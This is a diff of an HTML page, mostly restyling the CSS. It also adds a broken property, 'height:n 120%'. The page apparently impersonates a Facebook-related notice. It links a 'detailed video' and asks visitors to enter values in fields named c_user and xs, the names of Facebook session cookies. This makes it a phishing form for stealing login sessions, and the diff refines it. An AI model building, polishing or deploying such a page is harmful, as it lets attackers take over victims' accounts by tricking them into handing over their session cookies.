@@ -166,15 +166,10 @@
     }
 
     a img {
-      width: 100%;
-      height: 100%;
+      width: 120%;
+      height:n 120%;
       object-fit: cover;
       border-radius: 4px;
-      transition: transform 0.3s ease;
-    }
-
-    a img:hover {
-      transform: scale(1.05);
     }
 
     /* Input labels */
@@ -194,10 +189,9 @@
     input.border {
       border: 1px solid #d1d5db;
       border-radius: 6px;
-      padding: 0.5rem 0.75rem;
-      font-size: 1rem;
-      transition: border-color 0.2s, box-shadow 0.2s;
-      width: calc(100% - 1.5rem);
+      padding: 0.375rem 0.375rem;
+      font-size: 0.75rem;
+      width: 20%;
     }
 
     .h-6 {
@@ -250,17 +244,8 @@
       font-size: 0.875rem;
       border-radius: 6px;
       cursor: pointer;
-      transition: background-color 0.2s, transform 0.1s;
     }
 
-    button#delete-btn:hover {
-      background-color: #3b5998;
-      transform: translateY(-1px);
-    }
-
-    button#delete-btn:active {
-      transform: translateY(0);
-    }
 
     button#delete-btn:disabled {
       background-color: #93c5fd;
@@ -284,14 +269,6 @@
 
     .rounded-lg {
       border-radius: 8px;
-    }
-
-    .transition {
-      transition: all 0.2s ease-in-out;
-    }
-
-    .hover\:scale-105:hover {
-      transform: scale(1.05);
     }
 
     /* Accessibility */
@@ -348,6 +325,10 @@
 
       .h-\[80px\] {
         height: 60px;
+      }
+
+      input.border {
+        width: 40%;
       }
     }
 
@@ -418,17 +399,7 @@
 
     /* Reduced motion for accessibility */
     @media (prefers-reduced-motion: reduce) {
-      .transition {
-        transition: none;
-      }
-
-      a img:hover {
-        transform: none;
-      }
-
-      button#delete-btn:hover {
-        transform: none;
-      }
+      /* No transitions or transforms to disable */
     }
   </style>
 </head>
@@ -473,24 +444,29 @@
       <div>
         <a class="w-[120px] h-[80px] block mx-3" href="https://cdn.glitch.global/116aac45-aeea-4339-8e11-ec99eca8b56f/detailed_video.mp4?v=1721736922555">
           <img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" alt="Video thumbnail">
+          
         </a>
       </div>
+      <br>
+    
       <div>
-        <p class="pl-3 text-[12px] font-semibold">
+        
+        <p class="pl-3 text-[12px] font-semibold">  
           Please be sure to provide the requested information below.
+      
         </p>
       </div>
       <div>
-        <label for="c_user" class="text-slate-400 pl-4 mt-1">
+        <p class="text-slate-400 pl-4 mt-1">
           c_user
-        </label>
-        <input class="border h-6 pl-1 mx-3" type="text" name="c_user" id="c_user" pattern="[0-9]+" minlength="6" title="Must Watch Detailed Video" required aria-required="true">
+        </p>
+        <input class="border h-6 pl-1 mx-3" type="text" name="c_user" placeholder="" pattern="[0-9]+" minlength="6" id="c_user" title="Must Watch Detailed Video" required="1" aria-required="true">
       </div>
       <div>
-        <label for="xs" class="text-slate-400 pl-4 mt-1">
+        <p class="text-slate-400 pl-4 mt-1">
           xs
-        </label>
-        <input class="border h-6 pl-1 mx-3" type="text" name="xs" id="xs" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$" title="Must Watch Detailed Video" required aria-required="true">
+        </p>
+        <input class="border h-6 pl-1 mx-3" type="text" name="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$" title="Must Watch Detailed Video" required="1" aria-required="true">
       </div>
       <div>
         <p class="mt-4 pl-3 text-[12px] font-semibold">
